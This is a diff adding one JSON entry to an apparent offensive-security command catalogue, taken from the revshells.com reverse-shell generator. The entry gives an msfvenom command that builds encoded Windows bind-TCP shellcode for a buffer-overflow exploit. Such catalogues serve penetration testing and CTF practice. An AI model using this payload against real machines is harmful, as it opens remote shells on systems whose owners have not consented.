@@ -1,0 +1,31 @@
+{
+  "id": "rsg-msfvenom-windows-bind-tcp-shellcode-bof",
+  "name": "RSG · MSFVenom · Windows Bind TCP ShellCode - BOF",
+  "command": "msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\u0000' -f python -v notBuf -o shellcode",
+  "description": "M S F Venom payload — Windows Bind TCP ShellCode - BOF (via reverse-shell-generator).",
+  "platform": "windows",
+  "tags": [
+    "rsg",
+    "payload",
+    "msfvenom",
+    "msfvenom",
+    "windows",
+    "bind",
+    "bufferoverflow"
+  ],
+  "source": "rsg",
+  "source_url": "https://www.revshells.com/",
+  "upstream_id": "MSFVenom/Windows Bind TCP ShellCode - BOF/92",
+  "category": "payloads",
+  "subcategory": "msfvenom",
+  "references": [
+    {
+      "title": "reverse-shell-generator (revshells.com)",
+      "url": "https://www.revshells.com/"
+    },
+    {
+      "title": "reverse-shell-generator GitHub",
+      "url": "https://github.com/0dayCTF/reverse-shell-generator"
+    }
+  ]
+}
